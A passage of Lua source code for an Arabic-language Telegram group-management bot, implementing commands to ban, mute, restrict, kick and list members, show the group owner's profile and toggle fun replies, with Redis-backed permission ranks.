end
if UserId == "1573309498" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
end
if Redis:sismember(LaRiCa.."BanAll:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanAll:Groups",UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء العام (%d+)$') then
local UserId = text:match('^الغاء العام (%d+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanAll:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanAll:Groups",UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^كتم عام (%d+)$') then
local UserId = text:match('^كتم عام (%d+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if UserId == "1573309498" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
end
if UserId == "1573309498" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على مطور السورس*","md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end 
if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."ktmAll:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."ktmAll:Groups",UserId) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم العام (%d+)$') then
local UserId = text:match('^الغاء كتم العام (%d+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(LaRiCa.."ktmAll:Groups",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."ktmAll:Groups",UserId) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^حظر (%d+)$') then
local UserId = text:match('^حظر (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم حظره من الكروب ").Reply,"md",true)  
end
end
if text and text:match('^الغاء حظر (%d+)$') then
local UserId = text:match('^الغاء حظر (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text and text:match('^كتم (%d+)$') then
local UserId = text:match('^كتم (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusSilent(msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم (%d+)$') then
local UserId = text:match('^الغاء كتم (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if not Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end

if text and text:match('^تقييد (%d+)$') then
local UserId = text:match('^تقييد (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,0,0,0,0,0,0,0,0})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم تقييده في الكروب ").Reply,"md",true)  
end

if text and text:match('^الغاء التقييد (%d+)$') then
local UserId = text:match('^الغاء التقييد (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم الغاء تقييده من الكروب").Reply,"md",true)  
end
if text and text:match('^طرد (%d+)$') then
local UserId = text:match('^طرد (%d+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserInfo = LuaTele.getUser(UserId)
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId).." }*","md",true)  
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"• تم طرده من الكروب ").Reply,"md",true)  
end
if text == "نزلني" then
if not Redis:get(LaRiCa.."Status:remMe"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"*• امر نزلني تم تعطيله من قبل المدراء*","md",true)  
end
if The_ControllerAll(msg.sender.user_id) == true then
Rink = 1
elseif Redis:sismember(LaRiCa.."Devss:Groups",msg.sender.user_id)  then
Rink = 2
elseif Redis:sismember(LaRiCa.."Dev:Groups",msg.sender.user_id)  then
Rink = 3
elseif Redis:sismember(LaRiCa.."Owners:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 4
elseif Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 5
elseif Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 6
elseif Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 7
elseif Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 8
elseif Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id, msg.sender.user_id) then
Rink = 9
else
Rink = 10
end
if Rink == 10 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• ليس لديك رتب عزيزي*","md",true)  
end
if Rink <= 7  then
return LuaTele.sendText(msg_chat_id,msg_id,"• استطيع تنزيل الادمنيه والمميزين فقط","md",true) 
else
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, msg.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تنزيلك من الادمنيه والمميزين ","md",true) 
end
end
if text == 'ادمنيه الكروب' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
listAdmin = '\n*• قائمه الادمنيه \n ٴ— — — — — — — — — —*\n'
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Creator = '→ *{ المالك }*'
else
Creator = ""
end
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listAdmin = listAdmin.."*"..k.." - @"..UserInfo.username.."* "..Creator.."\n"
else
listAdmin = listAdmin.."*"..k.." -*["..UserInfo.id.."](tg://user?id="..UserInfo.id..") "..Creator.."\n"
end
end
LuaTele.sendText(msg_chat_id,msg_id,listAdmin,"md",true)  
end
if text == 'رفع الادمنيه' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(LaRiCa.."Supcreator:Group"..msg_chat_id,v.member_id.user_id) 
x = x + 1
else
Redis:sadd(LaRiCa.."Admin:Group"..msg_chat_id,v.member_id.user_id) 
y = y + 1
end
end
end
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم ترقيه - ('..y..') ادمنيه*',"md",true)  
end

if text == 'المالك' or text == 'المنشئ' then
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︰︰عذرآ البوت ليس ادمن في المجموعه يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = ''..Redis:get(itsEssen..'Essen:Channel:Join:Name')..'', url = 't.me/'..Redis:get(itsEssen..'Essen:Channel:Join')}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n 𝗐𝖾𝗅𝖼𝗈𝗆𝖾 𝗉𝗋𝗈 🦎.*',"md",false, false, false, false, reply_markup)
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.first_name == "" then
LuaTele.sendText(msg_chat_id,msg_id,"*⌔︰︰اوبس , المالك حسابه محذوف *","md",true)  
return false
end 
local photo = LuaTele.getUserProfilePhotos(UserInfo.id)
local InfoUser = LuaTele.getUserFullInfo(UserInfo.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
if photo.total_count > 0 then
local TestText = "  ❲ Owner Groups ❳\n━═━═━═━═━\n⌔︰*Owner Name* :  ["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n⌔︰*Owner Bio* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '٬ 𝙊𝙗𝙖 𝙇𝙖𝙍𝙞𝙘𝙖 🕷 ٫', url = "https://t.me/LaRiCaTEAM"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else

local TestText = "- معلومات المالك : \n\n- ["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n \n ["..Bio.."]"
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
end
end
end
end

if text == 'كشف البوتات' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في المجموعة يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
listBots = '\n• قائمه البوتات \n ٴ— — — — — — — — — —\n'
x = 0
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if Info_Members.members[k].status.luatele == "chatMemberStatusAdministrator" then
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
x = x + 1
Admin = '→ √'
else
Admin = "→ عضو"
end
listBots = listBots..""..k.." - @"..UserInfo.username.." "..Admin.."\n"
end
local s = ' ٴ— — — — — — — — — —\n• عدد البوتات هنا  '..#List_Members..'\n'
local t = '• عدد البوتات المرفوعه  '..x..'\n• ملاحظه علامة √ تعني ان البوت ادمن في هذه المجموعه'
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '• طرد البوتات •', data = 'kickBot'}, 
},
}
}
LuaTele.sendText(msg_chat_id,msg_id,"["..listBots.."]"..s..t,"md", false, false, false, false, reply_markup)  
end

if text == 'المقيدين' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Recent", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = nil
restricted = '\n*• قائمه المقيديين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.is_member == true and Info_Members.members[k].status.luatele == "chatMemberStatusRestricted" then
y = true
x = x + 1
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
restricted = restricted.."*"..x.." - @"..UserInfo.username.."*\n"
else
restricted = restricted.."*"..x.." -*["..UserInfo.id.."](tg://user?id="..UserInfo.id..") \n"
end
end
end
if y == true then
LuaTele.sendText(msg_chat_id,msg_id,restricted,"md",true)  
end
end


if text == "غادر" then 
if not msg.Dev then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(3)..'* ',"md",true)  
end
if not msg.ControllerBot and not Redis:set(LaRiCa.."LeftBot") then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• امر المغادره معطل من قبل الاساسي ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
LuaTele.sendText(msg_chat_id,msg_id,"*\n• تم مغادرة الكروب بامر من المطور*","md",true)  
local Left_Bot = LuaTele.leaveChat(msg.chat_id)
end
if text == "تفعيل صورتي" or text == "تفعيل الصوره" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:del(LaRiCa.."myphoto"..msg_chat_id)
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم تفعيل امر صورتي* ',"md",true)  
end
if text == "تعطيل صورتي" or text == "تعطيل الصوره" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa.."myphoto"..msg_chat_id,"off")
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم امر امر صورتي* ',"md",true)  
end
if text == "تفعيل نسبه جمالي" or text == "تفعيل جمالي" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:del(LaRiCa.."mybuti"..msg_chat_id)
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم تفعيل امر جمالي* ',"md",true)  
end
if text == "تعطيل جمالي" or text == "تعطيل نسبه جمالي" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa.."mybuti"..msg_chat_id,"off")
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم امر امر جمالي* ',"md",true)  
end
if text == "تفعيل قول" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:del(LaRiCa.."sayy"..msg_chat_id)
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم تفعيل امر قول* ',"md",true)  
end
if text == "تعطيل قول" then
if not msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa.."sayy"..msg_chat_id,"off")
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم امر امر قول* ',"md",true)  
end
if text == "جمالي" or text == 'نسبه جمالي' then
if Redis:get(LaRiCa.."mybuti"..msg_chat_id) == "off" then
LuaTele.sendText(msg_chat_id,msg_id,'*• نسبه جمالي معطله*',"md",true) 
else
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
if msg.Dev then
if photo.total_count > 0 then
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*نسبه جمالك هي 900% عشان مطور ولازم اطبله😹♥*", "md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• لا توجد صوره ف حسابك*',"md",true) 
end
else
if photo.total_count > 0 then
